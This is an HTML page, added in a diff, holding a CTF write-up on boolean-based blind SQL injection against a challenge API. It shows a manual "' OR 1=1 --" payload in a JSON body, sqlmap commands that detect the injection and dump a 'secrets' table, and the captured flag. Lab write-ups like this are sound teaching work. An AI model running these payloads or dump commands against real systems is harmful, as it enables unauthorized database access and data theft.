@@ -1,0 +1,495 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HACK SQL - CTF Write-Up</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #f1f1f0;
+      --ink: #0c0c0f;
+      --accent: #c3001a;
+      --muted: #4b4b4f;
+      --panel: rgba(255, 255, 255, 0.82);
+      --border: #d7d7d7;
+      --shadow: 0 22px 60px rgba(0, 0, 0, 0.12);
+      --code-bg: #fafafa;
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: var(--bg);
+      color: var(--ink);
+      font-family: 'Fira Code', 'JetBrains Mono', 'Roboto Mono', monospace;
+      line-height: 1.6;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      background-image:
+        radial-gradient(circle at 15% 20%, rgba(0, 0, 0, 0.03) 0 18%, transparent 20%),
+        radial-gradient(circle at 80% 10%, rgba(0, 0, 0, 0.03) 0 16%, transparent 18%),
+        linear-gradient(120deg, rgba(0, 0, 0, 0.04) 0%, rgba(0, 0, 0, 0.01) 50%, transparent 70%),
+        url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='160' height='160'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.8' numOctaves='2' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='160' height='160' filter='url(%23n)' opacity='0.07'/%3E%3C/svg%3E");
+      mix-blend-mode: multiply;
+      opacity: 0.65;
+      pointer-events: none;
+    }
+
+    body::after {
+      content: "";
+      position: fixed;
+      inset: 0;
+      background: radial-gradient(circle at 50% 65%, rgba(195, 0, 26, 0.06), transparent 40%);
+      pointer-events: none;
+    }
+
+    .watermark {
+      position: fixed;
+      right: -40px;
+      bottom: -20px;
+      width: 280px;
+      opacity: 0.08;
+      transform: rotate(-6deg);
+      mix-blend-mode: multiply;
+      pointer-events: none;
+    }
+
+    .container {
+      width: min(1100px, 92vw);
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 18px;
+      padding: clamp(18px, 3vw, 32px) clamp(18px, 4vw, 36px);
+      box-shadow: var(--shadow);
+      backdrop-filter: blur(1px);
+      position: relative;
+      overflow: hidden;
+    }
+
+    header {
+      display: grid;
+      grid-template-columns: 1fr auto;
+      gap: 18px;
+      align-items: center;
+      margin-bottom: 24px;
+    }
+
+    h1 {
+      margin: 0;
+      font-size: clamp(28px, 4vw, 40px);
+      letter-spacing: -0.02em;
+      color: var(--ink);
+    }
+
+    .subtitle {
+      margin: 6px 0 0;
+      color: var(--muted);
+      font-size: clamp(14px, 2.6vw, 18px);
+    }
+
+    .hero {
+      width: 180px;
+      justify-self: end;
+      filter: drop-shadow(0 20px 28px rgba(0, 0, 0, 0.15));
+    }
+
+    h2 {
+      margin: 0 0 10px;
+      font-size: 20px;
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      letter-spacing: -0.01em;
+      color: var(--ink);
+      position: relative;
+    }
+
+    h2::before {
+      content: "";
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: var(--accent);
+      box-shadow: 0 0 0 6px rgba(195, 0, 26, 0.12);
+    }
+
+    h3 {
+      margin: 12px 0 8px;
+      font-size: 16px;
+      color: var(--ink);
+    }
+
+    section {
+      margin-bottom: 22px;
+      padding-bottom: 6px;
+      border-bottom: 1px solid #e7e7e7;
+    }
+
+    p { margin: 0 0 12px; }
+
+    .code-box {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 14px;
+      box-shadow: 0 10px 24px rgba(0, 0, 0, 0.06);
+      overflow-x: auto;
+    }
+
+    pre {
+      margin: 0;
+      font-size: 14px;
+      line-height: 1.5;
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
+
+    code {
+      font-family: 'Fira Code', 'JetBrains Mono', 'Roboto Mono', monospace;
+      color: var(--ink);
+    }
+
+    figure {
+      margin: 12px 0;
+      background: #fbfbfb;
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.07);
+      overflow: hidden;
+    }
+
+    figure img {
+      display: block;
+      width: 100%;
+      background: #ededed;
+      cursor: zoom-in;
+      transition: transform 180ms ease, filter 180ms ease;
+    }    .figure-small {
+      max-width: 760px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .figure-small img {
+      max-height: 440px;
+      object-fit: contain;
+    }
+
+    figure img:hover {
+      transform: scale(1.02);
+      filter: brightness(0.98);
+    }
+
+    figcaption {
+      margin: 0;
+      padding: 10px 12px;
+      font-size: 13px;
+      color: var(--muted);
+      background: #f5f5f5;
+      border-top: 1px solid var(--border);
+    }
+
+    ul { margin: 8px 0 0 18px; padding: 0; color: var(--ink); }
+    li { margin-bottom: 8px; }
+
+    @media (max-width: 720px) {
+      header { grid-template-columns: 1fr; }
+      .hero { justify-self: start; width: 140px; }
+      .watermark { width: 200px; right: -30px; }
+    }
+
+    .lightbox {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.72);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 999;
+      backdrop-filter: blur(2px);
+    }
+
+    .lightbox.active { display: flex; }
+
+    .lightbox img {
+      max-width: 90vw;
+      max-height: 90vh;
+      border-radius: 12px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+    }
+
+    .lightbox .close {
+      position: fixed;
+      top: 18px;
+      right: 22px;
+      background: #111;
+      color: #fff;
+      border: 1px solid #444;
+      border-radius: 50%;
+      width: 34px;
+      height: 34px;
+      font-size: 18px;
+      cursor: pointer;
+      display: grid;
+      place-items: center;
+      box-shadow: 0 10px 24px rgba(0,0,0,0.4);
+    }
+
+    .social {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px;
+      margin-top: 16px;
+    }
+
+    .social a {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      padding: 10px 14px;
+      border-radius: 10px;
+      border: 1px solid var(--border);
+      background: linear-gradient(140deg, #fff, #f6f6f6);
+      color: var(--ink);
+      text-decoration: none;
+      font-weight: 600;
+      box-shadow: 0 10px 22px rgba(0,0,0,0.06);
+      transition: transform 140ms ease, box-shadow 140ms ease, border-color 140ms ease;
+    }
+
+    .social a:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 14px 26px rgba(0,0,0,0.1);
+      border-color: var(--accent);
+    }
+
+    .social a:active { transform: translateY(0); }
+  </style>
+</head>
+<body>
+  <img class="watermark" src="zz.jpeg" alt="Profile watermark">
+  <div class="lightbox" id="lightbox">
+    <button class="close" aria-label="Close image" id="lightbox-close">&times;</button>
+    <img src="" alt="zoomed view" id="lightbox-img">
+  </div>
+  <main class="container">
+    <header>
+      <div>
+        <h1>HACK SQL - CTF Write-Up</h1>
+        <p class="subtitle">From Pawn to King: Step-by-Step SQL Injection</p>
+      </div>
+      <div class="hero" aria-hidden="true">
+        <svg viewBox="0 0 220 220" role="presentation">
+          <defs>
+            <linearGradient id="shadowGrad" x1="0" x2="1" y1="0" y2="1">
+              <stop offset="0%" stop-color="rgba(0,0,0,0.22)"/>
+              <stop offset="100%" stop-color="rgba(0,0,0,0.08)"/>
+            </linearGradient>
+          </defs>
+          <g transform="translate(12,8)">
+            <g transform="translate(54 26)">
+              <g opacity="0.22" fill="url(#shadowGrad)" transform="translate(44 14) scale(1.18 1.06)">
+                <rect x="66" y="24" width="20" height="22" rx="5"></rect>
+                <rect x="56" y="44" width="40" height="74" rx="9"></rect>
+                <rect x="48" y="116" width="56" height="18" rx="6"></rect>
+                <rect x="40" y="134" width="72" height="16" rx="6"></rect>
+                <rect x="70" y="10" width="10" height="16" rx="2"></rect>
+                <rect x="62" y="16" width="26" height="8" rx="2"></rect>
+              </g>
+              <g fill="#0c0c0f">
+                <circle cx="48" cy="44" r="18"></circle>
+                <rect x="38" y="62" width="20" height="12" rx="6"></rect>
+                <rect x="26" y="76" width="44" height="18" rx="9"></rect>
+                <rect x="18" y="100" width="60" height="16" rx="8"></rect>
+                <rect x="10" y="122" width="76" height="16" rx="8"></rect>
+                <rect x="0" y="144" width="96" height="16" rx="8"></rect>
+              </g>
+            </g>
+          </g>
+        </svg>
+      </div>
+    </header>
+
+    <section id="intro">
+      <h2>Introduction</h2>
+      <p>A minimal interface hides a powerful backend. In this challenge we start as the "pawn" tester, uncover the weakness, and end up "king" with the database flag.</p>
+      <figure class="figure-small">
+        <img src="IMAGE/discription%20of%20ctf.png" alt="Challenge instance dashboard with launch link and flag submission box">
+        <figcaption>Challenge portal showing instance info, launch link, downloadable archive, and flag submission box.</figcaption>
+      </figure>
+    </section>
+
+    <section id="visit">
+      <h2>Visiting the Site</h2>
+      <p>We land on a sparse search page sending JSON to an API. No flashy clues - perfect for quiet recon.</p>
+      <p><strong>What we see:</strong></p>
+      <ul>
+        <li>A single search input field.</li>
+        <li>A bold SCAN button.</li>
+        <li>No login or authentication.</li>
+      </ul>
+      <p><strong>What this tells us:</strong></p>
+      <ul>
+        <li>User input is being processed by the backend.</li>
+        <li>It is most likely connected to a database.</li>
+        <li>This is a classic SQL injection scenario.</li>
+      </ul>
+      <figure class="figure-small">
+        <img src="IMAGE/visite_the_web_site.png" alt="Challenge landing page">
+        <figcaption>Initial look at the target interface.</figcaption>
+      </figure>
+    </section>
+
+    <section id="vuln">
+      <h2>Finding the Vulnerability</h2>
+      <p>Using Burp Suite, we intercept the request sent when SCAN is clicked. It is a JSON POST to <code>/api/check</code> with a single field <code>q</code>.</p>
+      <div class="code-box">
+        <pre><code>POST /api/check HTTP/1.1
+Content-Type: application/json
+
+{"q":"test"}</code></pre>
+      </div>
+      <p><strong>Important observations:</strong></p>
+      <ul>
+        <li>The request uses <strong>POST</strong>.</li>
+        <li>The data is sent as <strong>JSON</strong>.</li>
+        <li>The parameter name is <code>q</code>.</li>
+        <li>The value of <code>"test"</code> is directly user-controlled.</li>
+      </ul>
+      <p>This tells us the backend likely uses <code>q</code> inside an SQL query.</p>
+
+      <h3>Manual SQL Injection Testing (before sqlmap)</h3>
+      <p><strong>Step 1 - Test normal input (baseline):</strong></p>
+      <div class="code-box">
+        <pre><code>{"q":"test"}</code></pre>
+      </div>
+      <p>Response:</p>
+      <div class="code-box">
+        <pre><code>{"ok":false}</code></pre>
+      </div>
+      <p>This means the backend searched the database, found no match, and returned normally. Good baseline.</p>
+
+      <p><strong>Step 2 - Test a simple SQL injection payload:</strong></p>
+      <div class="code-box">
+        <pre><code>{"q":"' OR 1=1 --"}</code></pre>
+      </div>
+      <p><strong>Why this payload?</strong></p>
+      <ul>
+        <li><code>'</code> tries to break the SQL string.</li>
+        <li><code>OR 1=1</code> is always true.</li>
+        <li><code>--</code> comments out the rest of the query.</li>
+      </ul>
+      <p>Response flips to something like:</p>
+      <div class="code-box">
+        <pre><code>{"ok":true,"signal":"detected"}</code></pre>
+      </div>
+      <p>This is very important: our injected SQL changed the logic and the app behaved differently. SQL injection is confirmed manually.</p>
+
+      <p><strong>Understanding the type:</strong></p>
+      <ul>
+        <li>No SQL error messages are shown.</li>
+        <li>The app only returns true/false style answers.</li>
+        <li>We cannot see raw database output.</li>
+      </ul>
+      <p>Therefore, the vulnerability is <strong>boolean-based blind SQL injection</strong>.</p>
+    </section>
+
+    <section id="sqlmap">
+      <h2>Exploiting with SQLMap</h2>
+      <p>Now that SQL injection is confirmed, we automate with <code>sqlmap</code> using the same JSON body, the correct header, and the <code>q</code> parameter.</p>
+      <div class="code-box">
+        <pre><code>sqlmap -u "http://&lt;target&gt;/api/check"  --data='{"q":"test"}' --headers="Content-Type: application/json" -p q --dbms=sqlite --technique=B --batch --level=5 --risk=3</code></pre>
+      </div>
+      <p>sqlmap confirms:</p>
+      <ul>
+        <li>Parameter <code>q</code> is injectable.</li>
+        <li>Injection type: boolean-based blind.</li>
+        <li>Database: SQLite.</li>
+      </ul>
+      <figure>
+        <img src="IMAGE/get%20info%20from%20sql%20map.png" alt="sqlmap detection output">
+        <figcaption>sqlmap identifying boolean-based blind injection on parameter <code>q</code>.</figcaption>
+      </figure>
+    </section>
+
+    <section id="flag">
+      <h2>Extracting the Flag</h2>
+      <p>sqlmap output shows a table called <code>secrets</code> with a column <code>flag</code>. We dump exactly what we need:</p>
+      <div class="code-box">
+        <pre><code>sqlmap -u "http://&lt;target&gt;/api/check" --data='{"q":"test"}' --headers="Content-Type: application/json" -p q --dbms=sqlite --technique=B --batch --dump -T secrets -C flag</code></pre>
+      </div>
+      <div class="code-box" style="margin-top:10px;">
+        <pre><code>CYBERDUNE{safi_m3ana_zid_04919}</code></pre>
+      </div>
+      <p>Final result: challenge solved and flag captured.</p>
+      <figure>
+        <img src="IMAGE/5dit%20l%20flage.png" alt="sqlmap flag dump output">
+        <figcaption>sqlmap dump revealing the flag value from the <code>secrets</code> table.</figcaption>
+      </figure>
+    </section>
+
+    <section id="lessons">
+      <h2>What We Learned</h2>
+      <ul>
+        <li>How to inspect JSON-based POST requests.</li>
+        <li>Why a clean baseline request (<code>{"q":"test"}</code>) matters.</li>
+        <li>How to manually confirm SQL injection before using tools.</li>
+        <li>Difference between error-based and blind SQL injection.</li>
+        <li>How to configure sqlmap correctly for JSON, POST, parameter <code>q</code>, and SQLite.</li>
+        <li>Real pentesting always starts with careful manual recon.</li>
+      </ul>
+    </section>
+
+    <section id="Contact">
+      <h2>Contact</h2>
+      <p>Follow along or reach out:</p>
+      <div class="social">
+        <a href="https://github.com/adam-kan" target="_blank" rel="noopener">GitHub</a>
+        <a href="https://www.instagram.com/adam.x365.3/" target="_blank" rel="noopener">Instagram</a>
+        <a href="https://www.linkedin.com/in/adam-elkandoussi-058b8335a/" target="_blank" rel="noopener">LinkedIn</a>
+      </div>
+    </section>
+  </main>
+  <script>
+    const lb = document.getElementById("lightbox");
+    const lbImg = document.getElementById("lightbox-img");
+    const lbClose = document.getElementById("lightbox-close");
+
+    function closeLb() {
+      lb.classList.remove("active");
+      lbImg.src = "";
+    }
+
+    lbClose?.addEventListener("click", closeLb);
+
+    document.addEventListener("keyup", (e) => {
+      if (e.key === "Escape") closeLb();
+    });
+
+    document.querySelectorAll("figure img").forEach((img) => {
+      img.addEventListener("click", () => {
+        lbImg.src = img.src;
+        lb.classList.add("active");
+      });
+    });
+  </script>
+</body>
+</html>
+
+
+
+
